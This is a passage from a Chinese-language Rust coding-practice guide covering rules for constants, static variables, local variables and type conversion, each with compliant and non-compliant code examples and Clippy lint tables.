<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/index.html#tabs_in_doc_comments">tabs_in_doc_comments </a></td><td>yes</td><td>no</td><td>Style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="3-编程实践"><a class="header" href="#3-编程实践">3. 编程实践</a></h1>
<p>编码实践相关原则和规则，有助于编写更地道更安全的 Rust 代码。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="31-常量"><a class="header" href="#31-常量">3.1 常量</a></h1>
<p>在 Rust 中，常量有两种用途：</p>
<ul>
<li>编译时常量（Compile-time constants）</li>
<li>编译时求值 （CTEF, compile-time evaluable functions）</li>
</ul>
<p>常量命名风格指南请看 <a href="safe-guides/coding_practice/../code_style/naming.html">编码风格-命名</a></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gcns01-对于科学计算中涉及浮点数近似值的常量宜使用预定义常量"><a class="header" href="#gcns01-对于科学计算中涉及浮点数近似值的常量宜使用预定义常量">G.CNS.01 对于科学计算中涉及浮点数近似值的常量宜使用预定义常量</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>Rust标准库中已经提供了一些特殊常量的定义，其精确度通常会比开发者自行定义的高，所以若考虑数值精确度时则宜使用标准库已定义的特殊常量。</p>
<p>这些特殊常量都可以在标准库中找到，例如<a href="https://doc.rust-lang.org/std/f32/consts/index.html">std::f32::consts</a></p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let x = 3.14; // 不符合：自定义 Pi
let y = 1_f64 / x; // 不符合
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let x = std::f32::consts::PI; // 符合
let y = std::f64::consts::FRAC_1_PI; // 符合
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#approx_constant">approx_constant</a></td><td>yes</td><td>no</td><td>Correctness</td><td>deny</td></tr>
</tbody></table>
<p>该 Lint 默认为 <code>deny</code>，但在某些场景下，可以设置为<code>allow</code>，<code>#![allow(clippy::approx_constant)]</code>。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gcns02-不应断言常量布尔类型"><a class="header" href="#gcns02-不应断言常量布尔类型">G.CNS.02 不应断言常量布尔类型</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>此类语句会被编译器优化掉。最好直接使用 <code>panic!</code> 或 <code>unreachable!</code>代替。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
const B: bool = false;
assert!(B);
assert!(true);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
panic!（&quot;something&quot;）;
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>该示例需要维护一个常量的不变性，确保它在未来修改时不会被无意中破坏。类似于 <a href="https://docs.rs/static_assertions/1.1.0/static_assertions/">static_assertions</a> 的作用。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![allow(clippy::assertions_on_constants)]
<span class="boring">fn main() {
</span>const MIN_OVERFLOW: usize = 8192;
const MAX_START: usize = 2048;
const MAX_END: usize = 2048;
const MAX_PRINTED: usize = MAX_START + MAX_END;
assert!(MAX_PRINTED &lt; MIN_OVERFLOW);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#assertions_on_constants">assertions_on_constants</a></td><td>yes</td><td>no</td><td>Style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gcns03-不应将内部可变性容器声明为常量"><a class="header" href="#gcns03-不应将内部可变性容器声明为常量">G.CNS.03 不应将内部可变性容器声明为常量</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>由于常量有内联的特性。若将一个内容可变容器声明为常量，那么在引用它的时候同样会新建一个实例，这样会破坏内容可变容器的使用目的，
所以需要将它的值存储为静态（static）或者直接将其定义为静态。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::sync::atomic::{AtomicUsize, Ordering::SeqCst};
const CONST_ATOM: AtomicUsize = AtomicUsize::new(12);

// 不符合
CONST_ATOM.store(6, SeqCst); // 此处相当于新建了一个atomic实例，所以原容器内容并未改变
assert_eq!(CONST_ATOM.load(SeqCst), 12); // 仍为12，因为这两行的CONST_ATOM为不同实例

<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::sync::atomic::{AtomicUsize, Ordering::SeqCst};
const CONST_ATOM: AtomicUsize = AtomicUsize::new(12);

// 符合
static STATIC_ATOM: AtomicUsize = CONST_ATOM;
STATIC_ATOM.store(9, SeqCst);
assert_eq!(STATIC_ATOM.load(SeqCst), 9); // 使用`static`, 故上下文的STATIC_ATOM皆指向同一个实例

// 符合： 或直接声明为static
static ANOTHER_STATIC_ATOM: AtomicUsize = AtomicUsize::new(15);
ANOTHER_STATIC_ATOM.store(9, SeqCst);
assert_eq!(ANOTHER_STATIC_ATOM.load(SeqCst), 9);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#borrow_interior_mutable_const">borrow_interior_mutable_const</a></td><td>yes</td><td>no</td><td>Style</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#declare_interior_mutable_const">declare_interior_mutable_const</a></td><td>yes</td><td>no</td><td>Style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gcns04-不应在常量定义中增加显式的-static-生命周期"><a class="header" href="#gcns04-不应在常量定义中增加显式的-static-生命周期">G.CNS.04 不应在常量定义中增加显式的 <code>'static</code> 生命周期</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>在常量和静态变量声明时已经默认含有隐式的<code>'static</code>生命周期，所以不需要额外增加显式<code>'static</code>。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
const FOO: &amp;'static [(&amp;'static str, &amp;'static str, fn(&amp;Bar) -&gt; bool)] =
&amp;[...]
static FOO: &amp;'static [(&amp;'static str, &amp;'static str, fn(&amp;Bar) -&gt; bool)] =
&amp;[...]
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
const FOO: &amp;[(&amp;str, &amp;str, fn(&amp;Bar) -&gt; bool)] = &amp;[...]
 static FOO: &amp;[(&amp;str, &amp;str, fn(&amp;Bar) -&gt; bool)] = &amp;[...]
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#redundant_static_lifetimes">redundant_static_lifetimes</a></td><td>yes</td><td>no</td><td>Style</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gcns05--对于适用-const-fn-的函数或方法宜尽可能地使用-const-fn"><a class="header" href="#gcns05--对于适用-const-fn-的函数或方法宜尽可能地使用-const-fn">G.CNS.05  对于适用 <code>const fn</code> 的函数或方法宜尽可能地使用 <code>const fn</code></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>函数或方法缺失<code>const</code>关键词时无法被指派给常量。</p>
<p>但是要注意不是所有函数都能使用<code>const fn</code>，因为相比一般函数或方法，<code>const fn</code>在使用时会有限制，必须满足const 安全，如果不满足，编译器会报告错误信息。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn foo() -&gt; usize {
    10
}

// 不符合：必须是 constant 函数才能用于声明 const 常量
const BAZ: usize = foo(); 
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>const fn foo() -&gt; usize {
    10
} 

const BAZ: usize = foo(); // 符合
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>const fn foo() -&gt; bool {
    for _i in 0..5 {}      // ERROR, 因为for loop默认不能用在const fn内（需要注明#![feature(const_for)]）
    false
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#missing_const_for_fn">missing_const_for_fn</a></td><td>yes</td><td>no</td><td>Perf</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="32-静态变量"><a class="header" href="#32-静态变量">3.2 静态变量</a></h1>
<p>静态变量是用 <code>static</code> 关键字定义的全局静态变量。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gstv01--不宜直接使用可变静态变量作为全局变量"><a class="header" href="#gstv01--不宜直接使用可变静态变量作为全局变量">G.STV.01  不宜直接使用可变静态变量作为全局变量</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>对可变静态变量直接进行全局修改是 Unsafe 的。在多线程应用中，修改静态变量会导致数据竞争（data race）。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
static mut NUM_OF_APPLES: usize = 0;

unsafe fn buy_apples(count: usize) {
    NUM_OF_APPLES += count;
}

unsafe fn eat_apple() {
    NUM_OF_APPLES -= 1;
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>如果必须使用的话，可以通过 <code>thread_local!</code>宏在本地线程中使用内部可变性容器：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>thread_local!{
    // 符合
    static NEXT_USER_ID: Cell&lt;u64&gt; = Cell::new(0);
}
<span class="boring">}
</span></code></pre></pre>
<p>若需要变更的值的类型为整数或布尔时，可直接使用 atomic。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::sync::atomic::{AtomicUsize, Ordering::SeqCst};


// 符合
static NUM_OF_APPLES: AtomicUsize = AtomicUsize::new(0);

fn buy_apple(count: usize) {
    NUM_OF_APPLES.fetch_add(count, SeqCst);
}

fn eat_apple() {
    NUM_OF_APPLES.fetch_sub(1, SeqCst);
}
<span class="boring">}
</span></code></pre></pre>
<p>补充说明：</p>
<p>若需修改整数或布尔之外的数据类型时，可考虑使用 Mutex 或 Rwlock 配合 once_cell 对全局变量进行变更。</p>
<p>（注: once_cell 目前已经被引入到 Nightly 版本的标准库中但还不稳定, 可参考 <a href="https://doc.rust-lang.org/std/lazy/index.html">std::lazy</a>。若要在 Stable 版本下使用，则需要引入第三方库 <a href="https://docs.rs/once_cell/latest/once_cell/">once_cell</a>。）</p>
<pre><pre class="playground"><code class="language-rust">#![feature(once_cell)]          // 需要nightly compiler

use std::sync::Mutex;
use std::lazy::SyncLazy;        // 若使用stable版本则需要将之替换为once_cell::sync::Lazy

static GLOBAL_MESSAGE: SyncLazy&lt;Mutex&lt;String&gt;&gt; = SyncLazy::new(|| {
    Mutex::new(String::from(&quot;I'm hungry&quot;))
});

fn update_msg(msg: &amp;str) {
    let mut old_msg = GLOBAL_MESSAGE.lock().unwrap();
    *old_msg = msg.to_string();
}

fn main() {
    println!(&quot;{}&quot;, GLOBAL_MESSAGE.lock().unwrap()); // I'm hungry
    update_msg(&quot;I'm not hungry anymore!&quot;);
    println!(&quot;{}&quot;, GLOBAL_MESSAGE.lock().unwrap()); // I'm not hungry anymore!
}
</code></pre></pre>
<p>上述示例亦可通过使用第三方库 <a href="https://docs.rs/lazy_static/latest/lazy_static/">lazy_static</a> 的方式实现。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::sync::Mutex;
use lazy_static::lazy_static;

lazy_static! {
    static ref GLOBAL_MESSAGE: Mutex&lt;String&gt; = Mutex::new(String::from(&quot;I'm hungry&quot;));
}

fn update_msg(msg: &amp;str) {
    ...
}
...
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>在使用FFI引用外部，例如C的函数时，其本身有可能会返回全局变量。当 rust 接入这些函数时需要指定输入的变量类型为静态（static），而若要改变它们的值的时候就需要将其定义为可变静态变量（static mut）。</p>
<pre><pre class="playground"><code class="language-rust">use std::ffi::CString;
use std::ptr;

#[link(name = &quot;readline&quot;)]
extern {
    static mut rl_prompt: *const libc::c_char;
}

fn main() {
    let prompt = CString::new(&quot;[my-awesome-shell] $&quot;).unwrap();
    unsafe {
        rl_prompt = prompt.as_ptr();
        println!(&quot;{:?}&quot;, rl_prompt);
        rl_prompt = ptr::null();
    }
}
</code></pre></pre>
<p>通常情况下直接修改 static mut 会有线程安全风险，但若配合使用 <a href="https://doc.rust-lang.org/std/sync/struct.Once.html#">std::sync::Once</a> 则可保证该变量只初始化一次，不会产生线程安全风险。</p>
<p>（注：此用法在功能上等同于 <a href="https://docs.rs/once_cell/latest/once_cell/sync/struct.OnceCell.html">once_cell::sync::OnceCell</a> 或 Nightly 版本中的 <a href="https://doc.rust-lang.org/std/lazy/struct.SyncOnceCell.html">std::lazy::SyncOnceCell</a>。但在使用 Stable 版本编译器并且不使用第三方库的条件下此写法完全合规，故算作例外情况。）</p>
<pre><pre class="playground"><code class="language-rust">use std::sync::{Mutex, Once};

static mut SOUND: Option&lt;Mutex&lt;String&gt;&gt; = None;
static SOUND_ONCE: Once = Once::new();

fn make_sound() -&gt; &amp;'static Mutex&lt;String&gt; {
    unsafe {
        SOUND_ONCE.call_once(|| {
            SOUND = Some(Mutex::new(&quot;Oh! Apple! nom nom nom...&quot;.to_string()));
        });
        SOUND.as_ref().unwrap()
    }
}

fn main() {
    println!(&quot;{}&quot;, *make_sound().lock().unwrap()); // Oh! Apple! nom nom nom...
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>是否可定制</th></tr></thead><tbody>
<tr><td>_</td><td>no</td><td>no</td><td>_</td><td>yes</td></tr>
</tbody></table>
<p><strong>【定制化参考】</strong></p>
<p>这条规则如果需要定制 Lint，则应考虑两种情况:</p>
<ol>
<li>代码中定义为 static mut 的变量是否仅被用于 FFI</li>
<li>代码中定义为 static mut 的变量是否经过 call_once 初始化</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="33-本地变量"><a class="header" href="#33-本地变量">3.3 本地变量</a></h1>
<p>这里所说的变量单指局部变量而不包括全局变量。 默认情况下，Rust 会强制初始化所有变量的值，以防止使用未初始化的内存。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pvar01--一般情况下避免先声明可变变量再赋值"><a class="header" href="#pvar01--一般情况下避免先声明可变变量再赋值">P.VAR.01  一般情况下避免先声明可变变量再赋值</a></h2>
<p><strong>【描述】</strong></p>
<p>一般情况下，不要先声明一个可变的变量，然后在后续过程中再去改变它的值。声明一个变量的时候，要对其进行初始化。如果后续可能会改变其值，要考虑优先使用变量遮蔽（继承式可变）功能。如果需要在一个子作用域内改变其值，再使用可变绑定或可变引用。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
let mut base : u8;
if cfg!(not(USB_PROTOCOL_NEW_ARCH)) {
    base = other_instance.base;
} else {
    base = 42u8;
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
let base : u8 = if cfg!(not(USB_PROTOCOL_NEW_ARCH)) {
    other_instance.base
} else {
    42u8
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pvar02-利用变量遮蔽功能保证变量安全使用"><a class="header" href="#pvar02-利用变量遮蔽功能保证变量安全使用">P.VAR.02 利用变量遮蔽功能保证变量安全使用</a></h2>
<p><strong>【描述】</strong></p>
<p>在某些场景，可能会临时准备或处理一些数值，但在此之后，数据只用于检查而非修改。</p>
<p>那么可以将其通过变量遮蔽功能，重新绑定为不可变变量，来表明这种临时可变，但后面不变的意图。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合：代码语义上没有表现出来先改变，后不变那种顺序语义
let data = {
    let mut data = get_vec();
    data.sort();
    data 
}

//  `data` 在后面不会再被改变
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
let mut data = get_vec();
data.sort(); //临时需要排序
let data = data; // 符合： 后面就不需要改动了，由编译器可以确保

//  `data` 在后面不会再被改变
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gvar01--以解构元组方式定义超过四个变量时不应使用太多无意义变量名"><a class="header" href="#gvar01--以解构元组方式定义超过四个变量时不应使用太多无意义变量名">G.VAR.01  以解构元组方式定义超过四个变量时不应使用太多无意义变量名</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>在以解构元组的方式定义超过四个变量时，变量名可能是无特别语义的，如用单个字符表示的临时变量。但是不宜使用过多无意义变量名。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::many_single_char_names)]
<span class="boring">fn main() {
</span>// 不符合
let (a, b, c, d, e, f, g) = (...);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<p>元组元素超过四个的，建议使用包含语义的变量命。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::many_single_char_names)]
<span class="boring">fn main() {
</span>// 符合
let (width, high, len, shape, color, status) = (...);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#many_single_char_names">many_single_char_names</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<p>该 lint 对应 <code>clippy.toml</code> 配置项：</p>
<pre><code class="language-toml"># 修改可以绑定的单个字符变量名最大数量。默认为 4
single-char-binding-names-threshold=4
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gvar02--不应使用非-ascii-字符作为标识符"><a class="header" href="#gvar02--不应使用非-ascii-字符作为标识符">G.VAR.02  不应使用非 ASCII 字符作为标识符</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>Rust 语言默认支持 Non ASCII 字符作为合法标识符。但是，为了统一团队代码风格，建议使用最常用的 ASCII 字符作为合法标识符。</p>
<blockquote>
<p>此外，通常<strong>命名相关</strong>的 Clippy Lint 检查只支持英文命名。</p>
</blockquote>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 不符合
#[derive(Debug)]
struct 人 {
    /// 普通话
    名字: String,
    /// 廣東話
    屋企: String,
}

fn main () {
    let 我的名字 = &quot;मनीष&quot;.to_string();
    let 我嘅屋企 = &quot;Berkeley&quot;.to_string();
    
    // मराठी
    let मनीष = 人 {
        名字: 我的名字,
        屋企: 我嘅屋企,
    };
    
    // हिंदी
    let उसका_नाम = &quot;مصطفى&quot;.to_string();
    let 他的家 = &quot;Oakland&quot;.to_string();
   
    // اردو 
    let مصطفى = 人 {
        名字: उसका_नाम,
        屋企: 他的家,
    }; 
    
    println!(&quot;मी: {:?}&quot;, मनीष);
    println!(&quot;माझा मित्र: {:?}&quot;, مصطفى);
}

// 输出：
// मी: 人 { 名字: &quot;मनीष&quot;, 屋企: &quot;Berkeley&quot; }
// माझा मित्र: 人 { 名字: &quot;مصطفى&quot;, 屋企: &quot;Oakland&quot; }
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 符合
#[derive(Debug)]
struct People {
    name: String,
    addr: String,
}

fn main () {
    let name = &quot;मनीष&quot;.to_string();
    let addr = &quot;Berkeley&quot;.to_string();
    
    // मराठी
    let me = People {
        name: name,
        addr: addr,
    };
    
    // हिंदी
    let name = &quot;مصطفى&quot;.to_string();
    let addr = &quot;Oakland&quot;.to_string();
   
    // اردو     
    let he = People {
        name: name,
        addr: addr,
    }; 
    
    println!(&quot;my name: {:?}&quot;, me);
    println!(&quot;his name: {:?}&quot;, he);
}

// 输出
// my name: People { name: &quot;मनीष&quot;, addr: &quot;Berkeley&quot; }
// his name: People { name: &quot;مصطفى&quot;, addr: &quot;Oakland&quot; }
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://doc.rust-lang.org/rustc/lints/listing/allowed-by-default.html#non-ascii-idents">rustc-lint: non-ascii-idents</a></td><td>no</td><td>yes</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gvar03--变量遮蔽功能应当合理使用"><a class="header" href="#gvar03--变量遮蔽功能应当合理使用">G.VAR.03  变量遮蔽功能应当合理使用</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>变量遮蔽功能在功能上属于一种继承式可变。他会覆盖之前的变量绑定，而创建一个新的同名的变量绑定。</p>
<ol>
<li>在同一个作用域中，非必要时不宜通过新变量声明遮蔽旧变量声明的方式来修改变量。</li>
<li>在子作用域内修改“哨兵变量”时，应该避免使用变量遮蔽功能，防止引起逻辑bug。</li>
<li>如果使用变量遮蔽，禁止用不同类型的变量遮蔽前一个变量，如果实现同一个 <code>trait</code> 的可以例外。</li>
</ol>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::shadow_reuse, clippy::shadow_same, clippy::shadow_unrelated)]

fn main() {
    let mut a = 0;
    {
        // 不符合：这里使用变量遮蔽，代码逻辑已经被改变
        // clippy::shadow_unrelated
        let a = 42;
    }
    
    a; // use a again

    let x = 2; 
    // 不符合： 将会改变x的值
    // clippy::shadow_reuse
    let x = x + 1; 

    // 不符合：只是改变引用级别
    // clippy::shadow_same
    let x = &amp;x; 

    let y = 1;
    // 不符合：这里使用变量遮蔽逻辑已经被改变
    // clippy::shadow_unrelated
    let x = y; // 更早的绑定
    let z = 2;
    // 不符合：这里使用变量遮蔽逻辑已经被改变
    // clippy::shadow_unrelated
    let x = z; // 遮蔽了更早的绑定
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::shadow_reuse, clippy::shadow_same, clippy::shadow_unrelated)]

fn main() {
    let mut a = 0;
    {
        // 符合
        a = 42;
    }
    a;// use a again


    let x = 2;
    let y = x + 1; // 符合： 不改变x的值，声明新的变量y


    let ref_x = &amp;x; // 符合：不改变x的绑定，声明新的变量
    let z = 2;
    let w = z; // 符合： 使用不同的名字
}
</code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#shadow_reuse">shadow_reuse</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#shadow_same">shadow_same</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#shadow_unrelated">shadow_unrelated</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gvar04--避免因局部变量过大而导致的大量栈分配"><a class="header" href="#gvar04--避免因局部变量过大而导致的大量栈分配">G.VAR.04  避免因局部变量过大而导致的大量栈分配</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>Rust 局部变量默认分配在栈上。当局部变量占用栈空间过大时，会栈溢出。</p>
<p>采用<code>Box&lt;T&gt;</code>分配也可能出现栈溢出，参见<a href="https://github.com/rust-lang/rust/issues/53827">issues #53827</a>，因为目前 <code>Box&lt;T&gt;</code>的行为是先在栈上分配然后再复制到堆上。</p>
<p>Rust 默认栈分配空间为：</p>
<ol>
<li>主线程默认 <code>8MiB</code> 。</li>
<li>运行中代码创建的子线程默认是 <code>2MiB</code> 。</li>
</ol>
<p>也可以自行配置栈分配内存大小。</p>
<p>所以，局部变量占用多少空间才算过大，这个需要开发者根据具体的场景根据栈大小配置情况做出合适的预判，一般以 512 KiB为宜。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 不符合：运行时会栈溢出
    let a = [-1; 3000000];
    // or 
    // 不符合：运行时会栈溢出
    let a = Box::new([-1; 3000000]);
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合：栈大小适中
let _: [i32; 8000] = [1; 8000];
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="34-数据类型"><a class="header" href="#34-数据类型">3.4 数据类型</a></h1>
<p>数据类型记录 Rust 标准库提供的 原生类型，以及结构体和枚举体等编码实践。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ptyp01--必要时应使类型可以表达更明确的语义而不是只是直接使用原生类型"><a class="header" href="#ptyp01--必要时应使类型可以表达更明确的语义而不是只是直接使用原生类型">P.TYP.01  必要时，应使类型可以表达更明确的语义，而不是只是直接使用原生类型</a></h2>
<p><strong>【描述】</strong></p>
<p>在类型中表达语义，可以增加代码的可读性。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    // 不符合
    let years = 1942;
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 符合： 语义更明确
struct Years(i64);

fn main() {
    let years = Years(1942);
    let years_as_primitive_1: i64 = years.0; 
    let Years(years_as_primitive_2) = years; 
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gtyp01-类型转换尽可能使用安全的转换函数代替-as"><a class="header" href="#gtyp01-类型转换尽可能使用安全的转换函数代替-as">G.TYP.01 类型转换尽可能使用安全的转换函数代替 <code>as</code></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>当在数字类型之间转换时，需要注意的是，如果要确保不会存在有损转换(lossy conversion)，就不要使用 <code>as</code>，而应该使用 <code>From::from</code>。因为 From 只实现了无损转换。例如，可以用From从i32转换到i64，但反过来转换却不允许。</p>
<p>对于指针类型，尽量使用 <code>cast</code>方法来代替 <code>as</code> 直接转换。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(
    clippy::as_conversions,
    clippy::cast_lossless,
    clippy::cast_possible_truncation,
    clippy::cast_possible_wrap,
    clippy::cast_precision_loss,
    clippy::ptr_as_ptr
)]

fn as_u64(x: u8) -&gt; u64 {
    // 不符合
    x as u64
}
// or

// 不符合
fn main() {
    // or
    let ptr: *const u32 = &amp;42_u32;
    let mut_ptr: *mut u32 = &amp;mut 42_u32;
    let _ = ptr as *const i32; // 不符合
    let _ = mut_ptr as *mut i32; // 不符合
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
